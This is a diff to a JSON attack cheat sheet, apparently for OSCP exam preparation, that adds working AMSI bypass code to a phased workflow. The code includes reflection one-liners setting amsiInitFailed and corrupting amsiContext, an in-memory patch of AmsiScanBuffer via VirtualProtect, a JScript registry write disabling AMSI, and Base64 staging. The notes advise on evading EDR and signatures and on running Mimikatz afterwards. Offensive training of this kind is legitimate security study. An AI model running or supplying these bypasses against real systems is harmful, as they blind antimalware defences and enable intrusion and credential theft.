@@ -68,31 +68,59 @@
           "title": "Phase 1: Detection & Testing",
           "notes": "Always verify AMSI is active before attempting bypass. Baseline testing prevents wasted time on systems without AMSI enabled (Windows 7, Server 2012 R1 and older). Test with known malicious strings: 'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer'. If these strings echo without red errors, AMSI is not active (skip bypass, proceed directly to payload). If red 'malicious content' error appears, AMSI is active (proceed to Phase 2). Time investment: 30 seconds. OSCP tip: Test AMSI before downloading large payloads - saves bandwidth and time if bypass needed.",
           "commands": [
-            "amsi-test-payload"
+            {
+              "id": "amsi-test-payload",
+              "example": "'Invoke-Mimikatz'",
+              "shows": "String echoes back without red 'This script contains mali..."
+            }
           ]
         },
         {
           "title": "Phase 2: Quick Bypasses (In-Memory)",
           "notes": "Fastest methods for immediate access. These bypasses are session-specific and don't persist across reboots or new PowerShell sessions. Try in order: Context Corruption (best balance of speed/reliability) -> AmsiInitFailed (fastest but may be patched) -> Memory Patching (slowest but most reliable). All methods require active PowerShell session - can't be applied from cmd.exe to 'future' PowerShell sessions. Persistence note: Bypass must be reapplied for every new PowerShell process. Consider automating in initial access payload. OSCP timing: Budget 2-4 minutes for bypass in exam timeline. Practice typing these commands from memory - clipboard access may be limited in exam environment.",
           "commands": [
-            "amsi-context-corruption",
-            "amsi-init-failed",
-            "amsi-memory-patch"
+            {
+              "id": "amsi-context-corruption",
+              "example": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}",
+              "shows": "No output indicates success. Subsequent AMSI checks will ..."
+            },
+            {
+              "id": "amsi-init-failed",
+              "example": "[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}",
+              "shows": "No output. AMSI will report initialization failure and sk..."
+            },
+            {
+              "id": "amsi-memory-patch",
+              "example": "$Win32=@\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\nAdd-Type $Win32\n$lib=[Win32]::LoadLibrary(\"amsi.dll\")\n$addr=[Win32]::GetProcAddress($lib,\"AmsiScanBuffer\")\n$p=0\n[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)\n$patch=[Byte[]](0x48,0x31,0xC0,0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)",
+              "shows": "[+] AMSI patched successfully (if using verbose version)...."
+            }
           ]
         },
         {
           "title": "Phase 3: Persistent/Alternative Bypasses",
           "notes": "Use when in-memory bypasses fail or when persistence is needed across reboots/sessions. Registry-based bypasses survive reboots but may trigger EDR alerts (registry modification monitoring). Base64 staging useful for evading static signatures but less effective against modern Defender (scans decoded content). Trade-offs: Persistence = Higher detection risk, Session-only = Must reapply but lower forensic footprint. OSCP considerations: Registry changes persist in lab environment (may affect other students), Base64 useful for exam machines with strict execution policies. When to use: JScript/VBScript delivery (use registry method), Initial access payloads (embed Base64), Long-term persistence needed (registry method with cleanup plan). Cleanup: Always document registry keys created - required for OSCP report.",
           "commands": [
-            "amsi-jscript-registry",
-            "amsi-base64-staging"
+            {
+              "id": "amsi-jscript-registry",
+              "example": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
+              "shows": "Registry key set, AMSI disabled for current user's WSH se..."
+            },
+            {
+              "id": "amsi-base64-staging",
+              "example": "powershell -EncodedCommand [BASE64_BYPASS]",
+              "shows": "Bypass executes silently from encoded payload. Test with ..."
+            }
           ]
         },
         {
           "title": "Phase 4: Validation",
           "notes": "After bypass, always re-test with known malicious payload. Confirms AMSI is truly disabled, not just returning false positives. Test with multiple strings: 'Invoke-Mimikatz' (most reliable), 'amsiutils' (alternate test), actual payload snippet (end-to-end test). If test fails after bypass: Try next bypass method in sequence, Check for EDR interference (process injection, memory protection), Verify PowerShell version (.NET 4.0+ required for reflection methods), Consider alternate execution contexts (runspaces, background jobs). Success criteria: Test string echoes without red error, No Event ID 1116 in Windows Defender logs, Actual payload executes cleanly. Time investment: 10-15 seconds per validation. OSCP workflow: Test -> Bypass -> Re-test -> Execute payload. Never skip re-test step - false positives waste precious exam time.",
           "commands": [
-            "amsi-test-payload"
+            {
+              "id": "amsi-test-payload",
+              "example": "'Invoke-Mimikatz'",
+              "shows": "String echoes back without red 'This script contains mali..."
+            }
           ]
         }
       ],
